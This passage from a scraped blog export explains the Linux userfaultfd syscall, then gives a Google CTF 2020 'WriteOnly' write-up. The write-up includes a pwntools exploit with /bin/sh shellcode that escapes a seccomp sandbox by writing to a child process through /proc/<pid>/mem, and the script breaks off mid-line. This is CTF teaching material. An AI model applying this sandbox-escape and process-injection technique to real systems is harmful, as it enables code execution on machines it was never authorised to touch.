object.\n\n\nHey wait , what is a page fault?\nIn the event of an attempt of accessing a page which is no longer available in main memory , a kernel interrupt called page fault is setup which kind of gets back the page you were trying to access back into main memory from the secondary memory.\n{: .notice}\nSo basically , we use userfaultfd to keep track of page faults , which is kernel level stuff. \nBut how does userfaultfd do that??\nHow Does USERFAULTFD do what it does?\nSo once we create the userfaultfd object , we have to configure it using ioctl.\nOnce the userfaultfd object is configured , the application can use read to recieve userfaultfd notifications. The read can be blocking or non-blocking depending on the flags.\nSome intricate internals\nThe userfaultfd is designed to allow a separate thread in a multithreaded program to perform user-space paging for other threads in the process.\nWhen a page that is registered with userfaultfd gives a page fault , the faulting thread is put to sleep and an event is generated that can be read via the userfaultfd file descriptor.\nThe fault handling thread reads events from this file descriptor and services them using the operations described in ioctl_userfaultfd. Also , while servicing the page fault events , the fault-handling thread can trigger a wake-up for the sleeping thread.\nAn Ambiguity\nIt is possible for the faulting threads and the faul-handling threads to run in context of different processes. \nIn this case, these threads may belong to different programs, and the program that executes the faulting threads will not necessarily cooperate with the thread that handles page faults.\n{: .notice}\nIn such a non-cooperative mode , the process that monitors userfaultfd and handles page faults needs to be aware of the changes in the virtual memory layout of the faulting process to avoid memory corruption.\nWhat all information Userfaultfd notifies us\n\n\nNotify the faulting threads about changes in virtual memory layout of the faulting process.\n\n\nIf faulting thread invokes fork() , the userfaultfd objects maybe duplicated in the child process and we get notified about the uffd objects in the child processes using UFFD_EVENT_FORK. This allows user-space paging in the child process.\n\n\nSYNCHRONIZING Userfaultfd\nThe userfaultfd manager should carefully synchronize calls to UFFDIO_COPY with the processing of events.The noncooperative events asynchronously resume execution once the userfaultfd reads into its file descriptor.\nHandshake Between Kernel and Userspace\n\n\nAfter the creation of userfaultfd object , the application must enable it using the UFFDIO_API_ioctl operation. This operation allows handshake between kernel and userspace to determine the API version and supported features.\n\n\nThen , the application registers memory address ranges using UFFDIO_REGISTER\\ ioctl. \n\n\nAfter successful completion of UFFDIO_REGISTER , a page fault occuring in the requested memory range , will be forwarded by the kernel to the user-space application. The application can then use the UFFDIO_COPY or UFFDIO_ZEROPAGE ioctl operations to resolve page faults.\n\n\nUsing Userfaultfd only to detect pagefaults\nIf the application sets UFFD_FEATURE_SIGBUS using UFFDIO_API ioctl , a SIGBUS is delivered instead of any other notifications about page faults. \nReading from the userfaultfd structure\nEach read from the userfaultfd fd returns one or more uffd_msg structs, each of which describe a page-fault event or an even required for the non-cooperative userfaultfd usage.\n         struct uffd_msg {\n               __u8  event;            /* Type of event */\n               ...\n               union {\n                   struct {\n                       __u64 flags;    /* Flags describing fault */\n                       __u64 address;  /* Faulting address */\n                   } pagefault;\n\n                   struct {            /* Since Linux 4.11 */\n                       __u32 ufd;      /* Userfault file descriptor\n                                          of the child process */\n                   } fork;\n\n                   struct {            /* Since Linux 4.11 */\n                       __u64 from;     /* Old address of remapped area */\n                       __u64 to;       /* New address of remapped area */\n                       __u64 len;      /* Original mapping length */\n                   } remap;\n\n                   struct {            /* Since Linux 4.11 */\n                       __u64 start;    /* Start address of removed area */\n                       __u64 end;      /* End address of removed area */\n                   } remove;\n                   ...\n               } arg;\n\n               /* Padding fields omitted */\n           } __packed;\n\n\n\n\nIf multiple events are available and the supplied buffer is large enough , read returns as many events as the size of the buffer. Else if the buffer is smaller than the size of the uffd_msg struct , then it returns error.\nEach of the fields of the structure have been described in detail in the man page of userfaultfd.\n","id":"https://pwnverse.github.io/posts/userfaultfd/","title":"Understanding the Userfaultfd Syscall"},"https://pwnverse.github.io/posts/writeonly/":{"body":"We had a really great time this weekend playing this year's edition of Google CTF. Although we were able to solve only 2 of the pwn challenges , here's the intended writeup for the challenge WriteOnly.\ntl;dr\nTo begin with , we're just given a binary and it's source code. Skimming through the source code , we find the binary being hardened with seccomp bpf filter.\nHere's the list of all the allowed syscalls.\nvoid setup_seccomp() {\n  scmp_filter_ctx ctx;\n  ctx = seccomp_init(SCMP_ACT_KILL);\n  int ret = 0;\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(stat), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lstat), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(writev), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(access), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sched_yield), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(dup), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(dup2), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(clone), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fork), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(vfork), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(execve), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(kill), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chdir), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fchdir), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(gettimeofday), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getuid), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getgid), 0);\n  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);\n  ret |= seccomp_load(ctx);\n  if (ret) {\n    exit(1);\n  }\n}\n\n\nA surprise that the challenge has for us is that Read syscall is not allowed.\nIdea of exploit\nAgain, going through source code , we see a few things happening.\n\nA child is created which opens and reads 4 bytes of flag constantly.\nThe parent sets up seccomp, asks for a length and takes our shellcode as input and gives us code execution right away.\n\nint main(int argc, char *argv[]) {\n  pid_t pid = check(fork(), \"fork\");\n  if (!pid) {\n    while (1) {\n      check_flag();\n    }\n    return 0;\n  }\n\n  printf(\"[DEBUG] child pid: %d\\n\", pid);\n  void_fn sc = read_shellcode();\n  setup_seccomp();\n  sc();\n\n  return 0;\n}\n\n\nAn important thing to notice here is , seccomp is enabled in the parent after the child has been created. Hence , the child does not inherit seccomp, so how cool is that?\nThe only thing that we could think of was to somehow write to the child's memory and get code execution in child too. But the question was , what do we write to child and how do we do it?\nDelving into the exploit\nAs suggested by Sherl0ck, we could open a pseudo file called /proc/&lt;pid of child&gt;/mem and write to any segment of memory of the child , just like editing a binary in plain ghex :P. And what more , the program already prints the PID of child coupled with PIE being disabled , hence confirming our approach to exploitation.\nSo now , another question that should pop in our minds now is , where do we write in the memory of child to get code execution? We can blithely overwrite the return address of child with our shellcode. There's another problem , remember that child will die if parent dies , so we have to make sure that the parent is alive throughout our journey of popping shell through child.\nOverwriting return address of child\ntl;dr of the plan is :\n\nOpen /proc/&lt;pid of child&gt;/mem with read-write permissions.\nusing lseek syscall to seek to the return address of child.\nWrite shellcode to return address and finally loop parent so that it doesn't die out.\n\nfrom pwn import *\nimport sys\n\nHOST = 'writeonly.2020.ctfcompetition.com'\nPORT = 1337\ncontext.arch = 'amd64'\nif(len(sys.argv)&gt;1):\n    io=remote(HOST,PORT)\n    context.noptrace=True\nelse:\n    io=process('./chal')\n\nreu = lambda a : io.recvuntil(a)\nsla = lambda a,b : io.sendlineafter(a,b)\nsl = lambda a : io.sendline(a)\nrel = lambda : io.recvline()\nsa = lambda a,b : io.sendafter(a,b)\nre = lambda a : io.recv(a)\ns = lambda a : io.send(a)\n\nif __name__==\"__main__\":\n    #shellcode for execve /bin/sh\n\n    shell = asm(\"\"\"\n                mov r9,0x0068732f6e69622f\n                push r9\n                push rsp\n                pop rdi\n                xor rsi,rsi\n                xor rdx,rdx\n                mov rax,0x3b\n                syscall\n                \"\"\")\n    reu('child pid: ')\n    pid = int(rel().strip(),10)\n    log.info('pid -&gt; ' + str(pid))\n\n    #Adjusting /proc/pid/mem to 8 bytes and storing on stack\n    sc = asm('''\n    mov r9, 0x006d656d2f2f322f\n    push r9\n    mov r9, 0x2f2f636f72702f2f\n    push r9\n    push rsp\n    pop rdi\n    push rax\n    mov r10,rax\n    mov rsi,2\n    mov rdx,0\n    mov rax,2\n    syscall                       #Open file with read-write permissions\n    mov rdi,rax\n    mov r8,rdi\n    mov rax, 8\n    mov rsi,0x00000000004022e3    #lseek requires the address we want to seek to as offset\n    mov rdx,1\n    syscall\n    mov rax,1\n    mov rdi,r8\n    mov rsi,r10\n    add rsi,0x100                 #Fetching shellcode's address into rsi and writing to file\n    mov rdx,0x30\n    syscall\n    loop: jmp loop                #Make sure parent does not die\n            '''.format(\"0x\" + (str(pid) + '//')[::-1].encode('hex')))\n    sc = sc.ljust(0x100,'\\x00')\n    sc += shell  \n    log.info('sc len : ' + str(len(sc)))\n    sla('length?
